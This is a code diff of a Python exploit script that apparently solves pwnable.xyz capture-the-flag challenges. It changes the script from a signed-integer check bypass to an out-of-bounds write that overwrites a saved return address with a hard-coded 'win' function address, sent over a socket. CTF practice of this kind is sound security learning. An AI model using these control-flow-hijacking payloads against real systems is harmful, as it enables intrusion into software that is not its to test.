@@ -3,7 +3,9 @@ import socket
 import sys
 import time
 
-PROMPT = b"input:"
+PROMPT = b"Input:"
+WIN_ADDR = 0x400822  # from local disassembly (non-PIE)
+
 
 def recv_until(sock, token=PROMPT, timeout_sec=3.0):
     sock.settimeout(timeout_sec)
@@ -14,13 +16,14 @@ def recv_until(sock, token=PROMPT, timeout_sec=3.0):
             if not data:
                 break
             chunks.append(data)
-            if token in data:
+            if token in b"".join(chunks):
                 break
     except socket.timeout:
         pass
     return b"".join(chunks)
 
-def recv_all_brief(sock, timeout_sec=2.0):
+
+def recv_any(sock, timeout_sec=2.0):
     sock.settimeout(timeout_sec)
     chunks = []
     try:
@@ -33,28 +36,35 @@ def recv_all_brief(sock, timeout_sec=2.0):
         pass
     return b"".join(chunks)
 
+
 def try_connect(host: str, port: int, timeout_sec: float = 5.0):
     try:
         return socket.create_connection((host, port), timeout=timeout_sec)
     except socket.gaierror:
         if host == "svc.pwnable.xyz":
-            # Fallback to known IP from nmap resolution
-            return socket.create_connection(("134.209.56.140", port), timeout=timeout_sec)
+            # Fallback to nmap-resolved IP for this challenge
+            return socket.create_connection(("167.71.125.23", port), timeout=timeout_sec)
         raise
+
 
 def main():
     host = sys.argv[1] if len(sys.argv) > 1 else "svc.pwnable.xyz"
-    port = int(sys.argv[2]) if len(sys.argv) > 2 else 30001
+    port = int(sys.argv[2]) if len(sys.argv) > 2 else 30002
+
     with try_connect(host, port, 5.0) as sock:
-        banner = recv_until(sock)
-        sys.stdout.buffer.write(banner)
-        # Send two values that, when treated as unsigned 32-bit, satisfy (a - b) == 0x1337,
-        # while signed comparisons bypass the > 0x1336 checks: use a=-1 (0xFFFFFFFF), b=-4920 (0xFFFFECC8)
-        payload = b"-1 -4920\n"
-        sock.sendall(payload)
+        out = recv_until(sock)
+        sys.stdout.buffer.write(out)
+        # Overwrite saved RIP at arr[13] with WIN_ADDR by setting (a+b)=WIN_ADDR
+        line = f"{WIN_ADDR} 0 13\n".encode()
+        sock.sendall(line)
         time.sleep(0.05)
-        rest = recv_all_brief(sock, 3.0)
-        sys.stdout.buffer.write(rest)
+        out = recv_until(sock)  # read 'Result: ...' and next 'Input:'
+        sys.stdout.buffer.write(out)
+        # Cause scanf("%ld %ld %ld") to fail parsing -> triggers return
+        sock.sendall(b"q\n")
+        time.sleep(0.05)
+        out = recv_any(sock, 3.0)
+        sys.stdout.buffer.write(out)
 
 if __name__ == "__main__":
     main()
